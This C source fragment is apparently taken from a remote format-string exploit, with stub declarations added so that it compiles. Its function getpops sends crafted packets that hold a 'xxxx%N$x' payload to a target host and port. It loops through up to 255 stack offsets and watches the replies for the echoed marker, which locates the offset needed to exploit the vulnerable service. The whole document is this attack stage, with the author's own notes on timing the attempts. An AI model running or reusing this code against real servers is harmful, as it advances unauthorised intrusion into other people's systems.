
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int FMTSIZE ;
 scalar_t__ malloc (int) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 int printe (char*,int) ;
 int printf (char*,...) ;
 scalar_t__ send_packet (char*,unsigned short,char*,int,int) ;
 int sprintf (char*,char*,...) ;
 int strcmp (char*,char*) ;
 scalar_t__ strlen (char*) ;
 int usleep (int) ;

void getpops(char *hostname,unsigned short port){
 unsigned int pops=0;
 char orig[4+1];
 char match[8+1];
 char *buf;
 unsigned char *reply;
 if(!(buf=(char *)malloc(FMTSIZE+1)))
  printe("getpops(): allocating memory failed",1);
 printf("NOTE: i did not add the command to disconnec"
 "t the user.\nso, you have to wait roughly a minute "
 "before each user\n(format string placed as a user) "
 "times out.  basically,\nwait a minute in-between us"
 "ing it.  also, the packets may\nor may not come bac"
 "k in order. (or come back at all)\n\n");
 printf("[*] finding pop value: %s:%d.\n\n",hostname,
 port);
 while(pops++<255){
  memset(buf,0x0,(FMTSIZE+1));
  memcpy(buf,"\x00\x00\x00\x00\x00\x00\x00\x00\x03\x04"
  ,10);

  if(pops==37)
   sprintf(buf+10,"xxxx%c%c%%%d$x%cunused%c",pops,
   pops,pops,0x0,0x0);
  else
   sprintf(buf+10,"xxxx%c%%%d$x%cunused%c",pops,
   pops,0x0,0x0);
  reply=(char *)send_packet(hostname,port,buf,
  FMTSIZE,1);

  memset(orig,0x0,4+1);
  sprintf(orig,"%.4s",(reply+13));

  memset(match,0x0,8+1);
  sprintf(match,"%.8s",(reply+18));

  if(strlen(match)&&strlen(orig)&&
  !strcmp("xxxx",orig)){
   if(!strcmp("78787878",match)){
    printf("%d:\t(true)\t%s\n",reply[17],match);
    printf("\n[*] the pop value is: %d.\n",pops);
    return;
   }
   else
    printf("%d:\t(false)\t%s\n",reply[17],
    strlen(match)?match:"(no data)");
  }
  usleep(100000);
 }
 printf("\n[!] pop location find failed.\n");
 return;
}
